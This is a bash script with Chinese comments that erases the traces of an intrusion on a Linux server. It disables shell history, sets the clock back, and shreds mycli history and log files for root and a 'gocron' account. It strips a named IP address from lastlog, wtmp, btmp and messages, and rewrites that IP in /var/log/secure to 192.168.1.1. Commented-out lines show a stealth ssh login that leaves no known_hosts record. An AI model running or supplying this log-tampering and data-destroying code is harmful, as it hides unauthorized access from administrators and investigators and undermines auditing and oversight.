#!/usr/bin/env bash

#if [ $# -lt 1  ]; then
#    echo "Usage: $0 <file path>"
#    exit 1
#fi
#newDate='2022-01-20 12:26:21'
#date -s $newDate
#
#for i in "$*";do
#    echo '' > $i
#done
#
#ntpdate time.windows.com

#防止记录生成:
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG &&  export HISTFILE=/dev/null && export HISTSIZE=0 && export HISTFILESIZE=0

# 清理所有记录
filePath=("/root/.mycli.log" "/root/.mycli-history" "/home/gocron/.mycli.log" "/home/gocron/.mycli-history")

date -s '2022-01-20 12:26:21'

for i in "${filePath[@]}";do
    # -a 或–time=atime或–time=access或–time=use 只更改访问时间。
    # -m 或–time=mtime或–time=modify 　只更改修改时间
    # -d、-t 　使⽤指定的⽇期时间，⽽⾮现在的时间
    touch -am $i # 修改文件的访问,修改时间
    echo '' > $i # 清空文件内容
    shred -f -u -z -v -n 8 $i # 擦洗文件
done

#
ip='101.224.57.118'
# 清除用户最后一次登录时间
sed  -i "/$ip/"d /var/log/lastlog
# 清除登录系统成功的记录
sed  -i "/$ip/"d /var/log/wtmp
# 清除 记录所有登录失败信息，使用lastb命令查看
sed  -i "/$ip/"d /var/log/btmp
# 清除系统日志记录
sed  -i "/$ip/"d /var/log/message
# 清除安全日志记录
sed  -i "s/$ip/192.168.1.1/g" /var/log/secure

ntpdate time.windows.com



# 隐身登录
# -T表示不分配伪终端，/usr/bin/bash 表示在登录后调用bash命令 -i 表示是交互式shell
# ssh -T 10.1.171.85 /bin/bash -i
#不记录ssh公钥在本地.ssh目录中
# ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i

# 一天内修改过的文件
# find / -type f -mtime -1